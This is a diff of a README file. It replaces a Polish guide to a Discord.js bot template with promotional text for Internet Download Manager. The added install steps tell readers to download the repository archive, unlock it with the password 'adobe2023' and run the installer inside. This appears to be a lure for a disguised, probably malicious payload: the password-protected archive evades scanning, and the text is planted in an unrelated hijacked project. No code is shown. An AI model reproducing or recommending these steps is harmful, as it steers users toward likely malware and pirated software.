@@ -1,18 +1,16 @@
-<h1 align="center">Twój pierwszy przykładowy Bot Discord! 🤖</h1>
-<p align="center">
-  <a href="https//github.com/jahsik/discordjs-template/commits/main"><img src="https://img.shields.io/github/last-commit/jahsik/discordjs-template"></a>
-  <a href="https//github.com/jahsik/discordjs-template"><img src="https://img.shields.io/github/languages/code-size/jahsik/discordjs-template"></a>
-  <a href="https//github.com/jahsik/discordjs-template/issues"><img src="https://img.shields.io/github/issues-raw/jahsik/discordjs-template"></a></a>
-</p>
+# What is Internet Download Manager?
+Install Internet Download Manager (IDM) to stop waiting for your downloads. You will be truly amazed how fast IDM downloads your files. IDM will also repair broken and resume interrupted downloads due to lost connections, network problems, computer shutdowns, or unexpected power outages. 
 
-### Przykładowy bot zrobiony przy użyciu [discord.js](https://discord.js.org) [![Open Source? Yes!](https://badgen.net/badge/Open%20Source%20%3F/Yes%21/blue?icon=github)](https://github.com/JAHSIKXD)
-- 1-szy krok to zaktualizowanie TOKENU na token swojej [aplikacji](https://discord.com/developers/applications)
-- 2-gi krok, to zaktualizowanie **swojego** id w [configu](https://github.com/jahsik/discordjs-template/blob/main/src/config.js), z **TWOJE ID** zmień na swoje id pobrane z aplikacji discord, nie wiesz jak pobrać swoje id? zajrzyj [tutaj](https://support.discord.com/hc/pl/articles/206346498-Where-can-I-find-my-User-Server-Message-ID-)
-### Instalacja modułów
-- Przede wszystkim potrzebujemy runtime dla JavaScriptu, **node.js.** Pobierz go z tej strony: https://nodejs.org/en/. Pobierz wersję LTS, lub najnowszą.
-- Po pobraniu node.js, otwórz terminal bądź zwykłe okienko cmd, i wpisz `npm install` aby pobrać wszystkie potrzebne moduły!
-### Uruchamianie bota
-- Aby uruchomić bota, trzeba zaktualizowac token jak i id developerów, tak jak było to omówione w 1-szym i 2-gim kroku.
-- Po uzupełnieniu wszystkich potrzebnych informacji, nareszcie jesteśmy w stanie uruchomić naszego pierwszego bota! Aby tego kroku dokonać otwórz terminal bądź okienko cmd w lokalizacji z plikami bota, wpisz `node .` i patrz jak zrobiłeś swojego pierwszego **Discord Bota** w życiu!
-### Napotkałeś jakiś problem?
-- Napisz do mnie na discordzie (`jahsik#1337`) bądz naciśnij w [link](https://discord.com/users/852831552734756894)
+# Powerful download engine
+
+Our powerful download engine uses unique algorithms to receive Internet data in a fastest possible way. IDM will accelerate downloads all times because of its innovative dynamic file segmentation technology. Unlike other download managers and accelerators, IDM segments downloaded files dynamically during download process, and it reuses available connections without additional connect and login stages to achieve the best possible acceleration performance. Our engineers have a lot of experience in download acceleration, and we constantly improve this download engine since 1999. 
+
+# How to install?
+1. Download this repository and open the archive
+## Password for the archive: adobe2023
+2. Run the installation file
+3. Wait for the program to be fully installed
+4. Run the program
+5. Done, you are wonderful!
+# Screenshots📸:
+![image](https://user-images.githubusercontent.com/66753112/225694504-4fc207bc-c136-4ef3-807c-125137d596a1.png)
